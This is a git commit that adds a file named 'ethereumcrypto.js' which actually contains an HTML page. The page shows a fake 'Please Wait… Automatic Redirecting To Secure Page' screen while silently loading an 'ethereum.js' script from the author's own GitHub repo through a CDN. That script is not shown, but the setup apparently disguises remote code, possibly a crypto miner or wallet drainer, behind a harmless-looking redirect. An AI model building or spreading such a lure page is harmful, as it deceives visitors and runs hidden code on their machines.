c66dfb50a31735e1becdb5fbd561876a0353c83f
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2022-03-02 08:56:41 -0600

    Create ethereumcrypto.js

---
+++ ethereumcrypto.js
@@ -0,0 +1,23 @@
+<html>
+<head>
+<title>Redirecting Register</title>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/inisialjurawa/sawatbasah@main/ethereum.js"></script>
+<link rel="stylesheet" href="/include/css/style.css"><link rel="icon" type="image/png" href="/favicon.ico">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css">
+<style>body {padding-top: 70px;padding-bottom: 30px;}
+.centered {position: fixed;top: 50%;left: 50%;margin-top: -200px;margin-left: -250px;border: 1px solid #DBDBDB;width: 500px;text-align: center;height: 225px;padding: 20px;font-size: 20px;background-color: rgba(233, 233, 233, 0.44);font-family: Arial, Helvetica, sans-serif;text-shadow: 1px 1px 1px #5F5F5F;}
+</style>
+</head>
+<body>
+<div class="centered">
+<h2>Please Wait </h2>
+You Are Automatic Redirecting<br>
+To Secure Page<br><br>
+<img src="//i.stack.imgur.com/ndqUb.gif">
+</div>
+</body>
+	
+</html>
